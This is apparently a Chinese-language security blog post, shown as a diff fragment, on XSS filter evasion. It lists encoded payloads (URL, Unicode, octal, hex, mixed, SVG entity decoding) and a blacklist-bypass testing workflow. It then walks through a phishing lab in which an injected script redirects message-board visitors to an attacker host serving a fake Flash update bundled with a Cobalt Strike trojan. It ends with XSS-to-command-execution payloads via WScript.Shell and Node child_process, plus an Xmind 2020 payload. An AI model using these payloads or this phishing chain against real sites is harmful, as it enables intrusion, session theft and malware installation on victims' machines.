+<p>1.空元素(Void elements)，如 <code>&lt;area&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;base&gt;</code><br>等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。2.原始文本元素(Raw text elements)，有<br><code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>。原始文本元素可以容纳文本。3.RCDATA元素(RCDATA elements)，有 <code>&lt;textarea&gt;</code> 和<br><code>&lt;title&gt;</code>。RCDATA元素可以容纳文本和字符引用。4.外部元素(Foreign<br>elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。5.基本元素(Normal<br>elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。</p>
+<p>注意到RCDATA元素中有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code><br>两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以下面这个语句触发不了XSS：</p>
+<pre><code>&lt;textarea&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/textarea&gt;
+</code></pre>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202194554798</p>
+<p>但是如果直接放进去标签的内容呢，不带转义字符呢，如下：</p>
+<pre><code>&lt;textarea&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/textarea&gt;
+</code></pre>
+<p>同样也是不会触发XSS的：<br>image-20210202194424551<br>这涉及到了RCDATA的一个特殊的情况。即在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“&#x2F;”和对应的标签名，解析器会转换回“RCDATA状态”，并不会进入“标签开始状态”的。这意味着在RCDATA元素标签的内容中，唯一能够被解析器认做是标签的就只有<br><code>&lt;/textarea&gt;</code> 或者 <code>&lt;/title&gt;</code>，因此，在 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code><br>的内容中不会创建标签，就不会有脚本能够执行了。</p>
+<p>另外还有一点要注意：我们从上面HTML的五类元素中还发现有一个原始文本元素 <code>&lt;script&gt;</code><br>在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。浏览器看不懂中间这堆编码是和啥东西，所以也不会被执行，如下：</p>
+<pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+</code></pre>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202194716116</p>
+<p>那么如何才能让里面的内容进行转义并执行弹窗呢，这里需要利用到XSS的一个黑魔法——“svg”，我们下文中会提及。</p>
+<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。</p>
+<pre><code>&lt;ahref=&quot;...&quot;&gt;xx&lt;/a&gt;&lt;iframesrc=&quot;...&quot;&gt;
+</code></pre>
+<p>下面给出几个实例。</p>
+<p>•<code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></p>
+<pre><code>&lt;ahref=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;
+</code></pre>
+<p>•<code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></p>
+<pre><code>&lt;iframesrc=&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<p>注意，伪协议头 <code>javascript:</code><br>是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。就比如说<br><code>http://www.baidu.com</code> 可以被URL编码为<br><code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>，但是不能把协议也进URL编码：<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code><br>。</p>
+<p>但是伪协议头 <code>javascript:</code> 可以进行HTML编码。</p>
+<h2 id="Javascript-编码"><a href="#Javascript-编码" class="headerlink" title="Javascript 编码"></a>Javascript 编码</h2><p>我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<br><code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的<br>javascript 伪URL，也会进入 JavaScript 的解析模式。</p>
+<p>Javascript 中可以识别的编码类型有：</p>
+<p>•Unicode 编码•八进制编码•十六进制编码</p>
+<p>一般情况下我们使用Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。</p>
+<h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><p>•<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<pre><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&lt;/script&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&lt;/script&gt;
+</code></pre>
+<p>•<code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></p>
+<pre><code>&lt;ahref=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;&lt;ahref=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p>但要注意，我们同样也不能对伪协议头 <code>javascript:</code> 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进<br>Javascript 编码，但是能进行HTML编码。</p>
+<h3 id="在DOM环境中的JavaScript编码"><a href="#在DOM环境中的JavaScript编码" class="headerlink" title="在DOM环境中的JavaScript编码"></a>在DOM环境中的JavaScript编码</h3><p>对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，像下面的XSS向量是不能直接执行的：</p>
+<p>•<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<pre><code>&lt;script&gt;\141\154\145\162\164(&quot;xss&quot;)&lt;/script&gt;
+</code></pre>
+<p>•<code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></p>
+<pre><code>&lt;ahref=javascript:\x61\x6c\x65\x72\x74(&quot;xss&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p>如下图，插入之后没有任何反应：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202160311365<img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202160525348</p>
+<p>要想让他们能够执行我们要将他们放在DOM环境中，即DOM型的XSS。</p>
+<p>测试代码：</p>
+<pre><code>&lt;divid=&#39;s&#39;&gt;test&lt;/div&gt;&lt;script&gt;var search =&quot;...&quot;;    document.getElementById(&#39;s&#39;).innerHTML = search;&lt;/script&gt;
+</code></pre>
+<p>以上情况很多都是出现在你搜索后，显示你所查询的关键字，变量 <code>search</code> 是一个可控点，当我们查询一个XSS攻击向量后，变量 <code>search</code><br>就会被赋值为这个XSS向量，从而插入到div标签中触发XSS，如下所示：</p>
+<pre><code>&lt;divid=&#39;s&#39;&gt;test&lt;/div&gt;&lt;script&gt;var search =&quot;&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;&quot;;    document.getElementById(&#39;s&#39;).innerHTML = search;&lt;/script&gt;
+</code></pre>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202163852523</p>
+<p>此时如果过滤了 <code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>、<code>&amp;</code>、<code>%</code> 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS向量全部编码，即<br><code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> 的以下编码都可以弹窗：</p>
+<pre><code>// Unicode编码\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E// 八进制编码\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76// 十六进制编码\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e
+</code></pre>
+<p>image-20210202163825646<br>还有一种让八进制和十六进制编码的XSS攻击向量执行的方式便是将XSS向量放在某个能把字符串当做JavaScript代码来执行的函数里，比如eval()、setTimeout()、setInterval()等函数。如下示例：</p>
+<p>•<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<pre><code>&lt;script&gt;eval(&quot;\141\154\145\162\164\50\42\170\163\163\42\51&quot;)&lt;/script&gt;
+</code></pre>
+<p>•<code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></p>
+<pre><code>&lt;ahref=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p>•<code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></p>
+<pre><code>&lt;imgsrc=xonerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;
+</code></pre>
+<p>或者也可以直接将一整段js代码编码后放入eval()函数中执行。</p>
+<h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p><strong>混合编码就是对一个XSS向量同时进行多种编码，如下示例：</strong></p>
+<p>•<code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></p>
+<pre><code>// 对javascript:进行HTML编码, 对alert(&quot;xss&quot;)进行URL编码&lt;ahref=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;// 对javascript:进行HTML编码, 对alert进行Unicode编码&lt;ahref=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p><strong>也可以利用解码顺序进行混合编码，如下示例：</strong></p>
+<p>•<code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></p>
+<p>首先对“alert”进行JavaScript Unicode编码：</p>
+<pre><code>&lt;ahref=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p>然后再对 <code>\u0061\u006c\u0065\u0072\u0074</code> 进行URL编码：</p>
+<pre><code>&lt;ahref=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&quot;xss&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<p>最后对标签中的 <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> 整体进行HTML编码即可：</p>
+<pre><code>&lt;ahref=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&quot;xss&quot;)&gt;test&lt;/a&gt;
+</code></pre>
+<h2 id="SVG：XSS的一个黑魔法"><a href="#SVG：XSS的一个黑魔法" class="headerlink" title="SVG：XSS的一个黑魔法"></a>SVG：XSS的一个黑魔法</h2><p>我们在上文HTML编码那里最后留了一个坑，即HTML的五类元素中，像 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code><br>这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。</p>
+<p>也就是说，向下面这样的代码，浏览器不会对其中的HTML实体字符进行解码，也就不会执行并触发XSS了：</p>
+<pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>那如何绕过HTML原始文本元素进而执行HTML实体解码呢，这涉及到了 <code>&lt;svg&gt;</code><br>的魔力，那是一种特殊的触发效果，单纯script标签内加载html实体编码，只会当做文本，没有任何触发结果，如下图：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202201352827</p>
+<p>但是当在前面加上 <code>&lt;svg&gt;</code> 后，却成功弹窗了：</p>
+<pre><code>&lt;svg&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202200455541</p>
+<p>这是为什么呢？</p>
+<p>是因为 <code>&lt;svg&gt;</code> 标签属于HTML五大元素中的外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释，也就是说在解析到<code>&lt;svg&gt;</code><br>标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML解析中，实体编码会自动解码成相应的字符，重新来一遍标签开启状态，此时就会执行XSS了。如下图，弹窗后我们查看页面源码。发现原本不能被HTML解码的内容被<br><code>&lt;svg&gt;</code> 标签自动解码了：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210202200943830</p>
+<p>[CISCN2019 华东北赛区]Web2 这道题运用的就是这个知识点。</p>
+<h1 id="XSS-测试流程思路"><a href="#XSS-测试流程思路" class="headerlink" title="XSS 测试流程思路"></a>XSS 测试流程思路</h1><p>下面让我们来看一下XSS绕过的测试流程。</p>
+<p>现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：</p>
+<p>1.暴力测试（输入大量的payload，看返回结果）2.根据正则推算3.利用浏览器bug</p>
+<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>（1）尝试插入比较正常的HTML标签，例如：<code>&lt;a&gt;</code>、<code>&lt;b&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;u&gt;</code><br>等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p>
+<p>（2）尝试插入不闭合的标签，例如：<code>&lt;a</code>、<code>&lt;b</code>、<code>i&gt;</code>、<code>u&gt;</code>、<code>&lt;img</code> 等，然后看一下返回响应，是否对开放的标签也有过滤。</p>
+<p>（3）然后测试几种常见的XSS向量：</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;script&gt;confirm(1)&lt;/script&gt;......
+</code></pre>
+<p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了 alert、prompt、confirm 等字符，再尝试大小写的组合：</p>
+<pre><code>&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;
+</code></pre>
+<p>（4）如果过滤器仅仅是把 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签过滤掉，那么可以用双写的方式来绕过：</p>
+<pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;
+</code></pre>
+<p>这样当 <code>&lt;script&gt;</code> 标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。</p>
+<p>（5）用 <code>&lt;a href</code> 标签来测试，看返回响应</p>
+<pre><code>&lt;ahref=&quot;http://www.baidu.com&quot;&gt;click&lt;/a&gt;
+</code></pre>
+<p>看看 <code>&lt;a</code> 标签是否被过滤，href 是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：</p>
+<pre><code>&lt;ahref=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;
+</code></pre>
+<p>看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。</p>
+<p>继续测试事件触发执行javascript：</p>
+<pre><code>&lt;ahref=xonmouseover=alert(1)&gt;ClickHere&lt;/a&gt;
+</code></pre>
+<p>看onmouseover事件是否被过滤。</p>
+<p>测试一个无效的事件，看看他的过滤规则：</p>
+<pre><code>&lt;ahref=xonclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;
+</code></pre>
+<p>是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：</p>
+<pre><code>&lt;bodyonhashchange=alert(1)&gt;&lt;ahref=#&gt;click&lt;/a&gt;
+</code></pre>
+<blockquote>
+<p>onhashchange 事件在当前 URL 的锚部分(以 ‘#’ 号为开始) 发生改变时触发 。</p>
+</blockquote>
+<h2 id="测试其他标签和属性"><a href="#测试其他标签和属性" class="headerlink" title="测试其他标签和属性"></a>测试其他标签和属性</h2><p>HTML的标签和属性太多了，上文中已经列出了很多了。</p>
+<h1 id="XSS-攻击面拓展"><a href="#XSS-攻击面拓展" class="headerlink" title="XSS 攻击面拓展"></a>XSS 攻击面拓展</h1><h2 id="利用-XSS-钓鱼"><a href="#利用-XSS-钓鱼" class="headerlink" title="利用 XSS 钓鱼"></a>利用 XSS 钓鱼</h2><h3 id="通过-XSS-盗取-Cookie"><a href="#通过-XSS-盗取-Cookie" class="headerlink" title="通过 XSS 盗取 Cookie"></a>通过 XSS 盗取 Cookie</h3><p>Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。最简单的比如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>，执行后会弹出当前页面的cookie信息。在目标没有“同源策略”的保护下，我们可以利用XSS盗取目标网站管理员的Cookie。</p>
+<p>在一般的通用CMS下呢，为了通用模板的兼容性，许多CMS本身不会使用“同源策略”等其他手段来防护XSS漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现XSS漏洞，我们就可以直接获取目标的Cookie然后使用特定的方法来传输cookie。</p>
+<p>这里，我们可以利用网上现成的或自己搭建的XSS平台来完成利用过程。</p>
+<h3 id="Flash-弹窗钓鱼"><a href="#Flash-弹窗钓鱼" class="headerlink" title="Flash 弹窗钓鱼"></a>Flash 弹窗钓鱼</h3><p>之前看过很多大佬使用XSS漏洞弹出Flash的更新页面进行钓鱼的操作。今天我们终于有机会来演示一下了。</p>
+<p>其原理就是通过XSS漏洞，弹出Flash更新请求诱使用户点击，使用户跳转到设置好的钓鱼页面（伪造好的Flash更新页面），下载伪造的Flash组件（木马程序）并执行，最终实现反弹Shell上线CS，完成钓鱼攻击。下面我们搭建环境进行演示。</p>
+<p><strong>实验环境：</strong></p>
+<p>主机环境：</p>
+<p>•攻击机kali：192.168.0.182•受害机：192.168.0.125</p>
+<p>工具环境：</p>
+<p>•WeBug4.0•Flash 官网源码</p>
+<p><strong>（1）制作 CS 捆绑木马</strong></p>
+<p>这里我们选择制作WinRAR自解压捆绑木马，将 CS<br>木马与真正的Flash更新程序捆绑在一起，详情参考我的文章：《钓鱼攻击：制作WinRAR自解压捆绑木马进行钓鱼攻击》</p>
+<p><strong>（2）搭建Flash钓鱼页面</strong></p>
+<p>首先我们需要在kali上搭建一个钓鱼页面，需要下载Flash官方页面的源码进行修改。这里有两个项目可以选择：</p>
+<p>•项目一地址：<a target="_blank" rel="noopener" href="https://github.com/Wileysec/adobe-flash-phishing-page">https://github.com/Wileysec/adobe-flash-phishing-page</a></p>
+<p>该项目是模仿的 Flash Player 中文官网的页面：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304170810399</p>
+<p>需要在index.html中的加入我们制作的木马的链接地址：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304172509118</p>
+<p>•项目二地址：<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></p>
+<p>该项目是一个逼真的Flash更新提醒的弹窗，强迫症都会忍不住去点击下载的：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304171159133</p>
+<p>我们这里使用第二种方法，点击“立即升级”的这个按钮点击会下载我们提前准备好的 CS 木马。如果管理员以为自己的 Flash<br>版本过低的话，可能会下载并运行这个木马。</p>
+<p>找到flash.js，搜索链接“<a target="_blank" rel="noopener" href="https://www.se7ensec.cn/%E2%80%9D%EF%BC%8C%E5%B0%86%E5%85%B6%E6%94%B9%E4%B8%BA%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%9D%E5%AD%98%E5%8D%B3%E5%8F%AF%EF%BC%9A">https://www.se7ensec.cn/”，将其改为我们制作的木马的链接地址，然后保存即可：</a></p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304173233649</p>
+<p>然后将伪造的Flash页面搭建在攻击机kali的Web服务上：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304173812031</p>
+<p><strong>（3）插入 XSS 攻击向量</strong></p>
+<p>访问目标网站：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>image-20210304173934856</p>
+<p>在最下方发现一个留言板：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304173956429</p>
+<p>经测试存在XSS漏洞，我们插入一下payload：</p>
+<pre><code>&lt;script&gt;window.location.href=&quot;http://192.168.0.182&quot;;&lt;/script&gt;
+</code></pre>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304175329132</p>
+<p>这样，当用户再次访问该页面或管理员在后台查看评论时，就会将页面劫持到我们所伪造的钓鱼页面上：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304175404485</p>
+<p>当受害者强迫症忍不住去点击“立即升级”时，就会下载我们所准备好的 CS 捆绑木马：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304175914235</p>
+<p>如果受害者以为自己的 Flash 版本过低的话，就可能会运行这个木马。如下图所示，受害者主机成功上线：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210304180543849</p>
+<h2 id="XSS-to-RCE"><a href="#XSS-to-RCE" class="headerlink" title="XSS to RCE"></a>XSS to RCE</h2><p>为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。</p>
+<h3 id="使用-WScript-Shell-执行系统命令"><a href="#使用-WScript-Shell-执行系统命令" class="headerlink" title="使用 WScript.Shell 执行系统命令"></a>使用 WScript.Shell 执行系统命令</h3><p>WScript.Shell（Windows Script Host Runtime<br>Library）是一个对象，对应的文件是C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下：</p>
+<pre><code>var shell =newActiveXObject(&quot;WScript.Shell&quot;);shell.run(&quot;calc.exe&quot;);
+</code></pre>
+<p>有时候为了 Bypass 也可以使用 <code>String.fromCharCode</code> 从 Ascii 来转化恶意代码：</p>
+<pre><code>&lt;imgsrc=xonerror=&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;&gt;
+</code></pre>
+<h3 id="使用-child-process-执行系统命令"><a href="#使用-child-process-执行系统命令" class="headerlink" title="使用 child_process 执行系统命令"></a>使用 child_process 执行系统命令</h3><p>如果目标环境启用了 NodeJS 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令：</p>
+<pre><code>&lt;imgsrc=xonerror=&quot;const exec = require(&#39;child_process&#39;).exec;exec(&#39;whoami&#39;).stdout.on(&#39;data&#39;,function(data){alert(data);})&quot;&gt;&lt;imgsrc=xonerror=&quot;require(&#39;child_process&#39;).exec(&#39;calc&#39;);&quot;&gt;&lt;img src=x onerror=&quot;require(&#39;child_process&#39;).exec(&#39;&lt;更多稀奇古怪的Payload&gt;&#39;);&quot;&gt;
+</code></pre>
+<p>能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS<br>。请继续往下看。</p>
+<h3 id="Xmind-2020-XSS-漏洞"><a href="#Xmind-2020-XSS-漏洞" class="headerlink" title="Xmind 2020 XSS 漏洞"></a>Xmind 2020 XSS 漏洞</h3><p>XMind 是一款专业的全球领先的商业思维导图软件，在国内使用广泛，拥有强大的功能、包括思维管理、商务演示、与办公软件协同工作等功能。它采用全球先进的<br>Eclipse RCP 软件架构，是集思维导图与头脑风暴于一体的可视化思考工具，能用来捕捉想法、理清思路、管理复杂信息并促进团队协作。XMind<br>思维导图软件曾被著名互联网媒体 Lifehacker 评选为“最佳头脑风暴和思维导图工具”及”最受欢迎的思维导图软件”。</p>
+<p>2021年5月10日，被爆 Xmind 2020 中存在 XSS 漏洞，攻击者可以借助该漏洞实现命令执行，在实际环境中借助钓鱼攻击可能造成更严重的危害。</p>
+<p>漏洞利用很简单，在 “思维导图” 中输出 Payload：</p>
+<pre><code>&lt;imgsrc=xonerror=alert(&#39;xss&#39;)&gt;
+</code></pre>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210518200806469</p>
